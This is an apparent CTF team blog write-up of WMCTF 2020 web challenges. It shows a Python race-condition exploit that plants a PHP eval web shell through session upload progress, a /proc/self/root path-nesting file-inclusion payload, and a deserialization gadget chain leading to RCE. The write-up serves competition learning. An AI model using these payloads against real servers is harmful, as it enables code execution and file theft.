<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>WMCTF 2020 SU Write-Up -</title><meta name=description content="æ„Ÿè°¢ WM çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬ SU å–å¾—äº† 2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ WMCTF 2020 çš„ writeupã€‚"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/wmctf-2020-su-wu\/","name":"Wmctf 2020 su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"WMCTF 2020 SU Write-Up","description":"æ„Ÿè°¢ WM çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬ SU å–å¾—äº† 2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com\nä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ WMCTF 2020 çš„ writeupã€‚\n","inLanguage":"en","wordCount":3944,"datePublished":"2020-08-04T21:35:50\u002b00:00","dateModified":"2020-08-04T21:35:50\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["WMCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/wmctf-2020-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="WMCTF 2020 SU Write-Up"><meta property="og:description" content="æ„Ÿè°¢ WM çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬ SU å–å¾—äº† 2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ WMCTF 2020 çš„ writeupã€‚"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/wmctf-2020-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="WMCTF 2020 SU Write-Up"><meta name=twitter:description content="æ„Ÿè°¢ WM çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬ SU å–å¾—äº† 2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.com
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ WMCTF 2020 çš„ writeupã€‚"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>WMCTF 2020 SU Write-Up</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 4, 40850
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;19&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3944&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#web>Web</a><ul><li><a href=#web_checkin>web_checkin</a></li><li><a href=#make-php-great-again>Make PHP Great Again</a></li><li><a href=#make-php-great-again-and-again>Make PHP Great Again And Again</a></li><li><a href=#webweb>webweb</a></li><li><a href=#gogogo>gogogo</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#mengyedekending>mengyedekending</a></li><li><a href=#csgo>csgo</a></li><li><a href=#roshambo>roshambo</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#dalabengba>Dalabengba</a></li><li><a href=#xman_happy_birthday>XMAN_Happy_birthday!</a></li><li><a href=#music_game>Music_game</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#wmware>Wmware</a></li><li><a href=#welcome-to-ctf>Welcome to CTF</a></li><li><a href=#easy_re>easy_re</a></li><li><a href=#meet_in_july>Meet_in_July</a></li><li><a href=#easy_apk>easy_apk</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#babysum>babySum</a></li><li><a href=#piece_of_cake>piece_of_cake</a></li><li><a href=#game>Game</a></li><li><a href=#idiot-box>idiot box</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æ„Ÿè°¢ WM çš„å¸ˆå‚…ä»¬ç²¾å¿ƒå‡†å¤‡çš„æ¯”èµ›ï¼æœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬ SU å–å¾—äº† 2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼š<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a></p><p>ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ WMCTF 2020 çš„ writeupã€‚</p><h2 id=web>Web</h2><h3 id=web_checkin>web_checkin</h3><p><strong>Third Blood</strong></p><p><a href="http://web_checkin.wmctf.wetolink.com/?content=/flag">http://web_checkin.wmctf.wetolink.com/?content=/flag</a></p><h3 id=make-php-great-again>Make PHP Great Again</h3><p>session åŒ…å«</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sessid</span> <span class=o>=</span> <span class=s1>&#39;TGAO&#39;</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span><span class=s2>&#34;system(&#39;cat flag.php&#39;);&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=n>session</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>50</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span> <span class=s1>&#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;</span><span class=p>},</span> <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s1>&#39;tgao.txt&#39;</span><span class=p>,</span><span class=n>f</span><span class=p>)},</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;PHPSESSID&#39;</span><span class=p>:</span> <span class=n>sessid</span><span class=p>}</span> <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>session</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#39;</span><span class=o>+</span><span class=n>sessid</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;tgao.txt&#39;</span> <span class=ow>in</span> <span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>event</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+++++++++++++]retry&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span><span class=o>==</span><span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl> <span class=n>event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
</span></span><span class=line><span class=cl> <span class=k>with</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span> <span class=k>as</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>30</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>       <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>write</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>session</span><span class=p>,))</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>30</span><span class=p>):</span>
</span></span><span class=line><span class=cl>       <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>read</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>session</span><span class=p>,))</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl> <span class=n>event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=make-php-great-again-and-again>Make PHP Great Again And Again</h3><p><strong>Second Blood</strong></p><p>å› ä¸º require_once è¯»ä¸äº† flag.php, æ ¹æ®ä¸Šä¸€é¢˜ flag çš„æç¤ºæ˜¯ php è‡ªå·±çš„é—®é¢˜, æ‰¾äº†åŠå¤©å‘ç°<br><a href=https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c>https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c</a></p><p><img src=https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png alt></p><p>è¶…è¿‡ 32 å±‚ä¼šåœæ­¢è¯»ç¬¦å·é“¾æ¥, æ‰€ä»¥ç”¨ /proc/self/root å¥— 33 å±‚å¨ƒå³å¯</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>v2222</span><span class=o>.</span><span class=n>no_body_knows_php_better_than_me</span><span class=o>.</span><span class=n>glzjin</span><span class=o>.</span><span class=n>wmctf</span><span class=o>.</span><span class=n>wetolink</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=err>?</span><span class=n>file</span><span class=o>=</span><span class=n>php</span><span class=p>:</span><span class=o>//</span><span class=n>filter</span><span class=o>/</span><span class=n>read</span><span class=o>=</span><span class=nb>convert</span><span class=o>.</span><span class=n>base64</span><span class=o>-</span><span class=n>encode</span><span class=o>/</span><span class=n>resource</span><span class=o>=</span><span class=n>compress</span><span class=o>.</span><span class=n>zlib</span><span class=p>:</span><span class=o>//</span><span class=n>file</span><span class=p>:</span><span class=o>///</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>flag</span><span class=o>.</span><span class=n>php</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=webweb>webweb</h3><p>ååºåˆ—åŒ– gadgets æŒ–æ˜, æ²¡å•¥å¥½è¯´çš„, éœ€è¦æ³¨æ„ä¸‹æ¸…ç©ºä¸€äº›ç±»çš„æ„é€ å‡½æ•°, ä¸ç„¶ä¸œè¥¿å¤ªå¤šä¼š 413</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>lib/cli/ws.php __destruct å…¥å£, fuction ä»»æ„, å‚æ•°ä¸å¯æ§, æ˜¯ä¸€ä¸ªå¯¹è±¡
</span></span><span class=line><span class=cl>lib/db/mongo/mapper.php $this-&gt;collection-&gt;insertone($this-&gt;document); å‚æ•°å¯æ§
</span></span><span class=line><span class=cl>lib/db/sql/mapper.php __call æ›¿æ¢ call çš„ function, insertone-&gt;ä»»æ„ function, åˆ°è¿™é‡Œå¯ä»¥ç”¨ä»»æ„å‚æ•° call ä»»æ„å•å‚æ•°å‡½æ•°
</span></span><span class=line><span class=cl>lib/web.php send è¯»æ–‡ä»¶ æˆ–è€… lib/base.php clear RCE
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
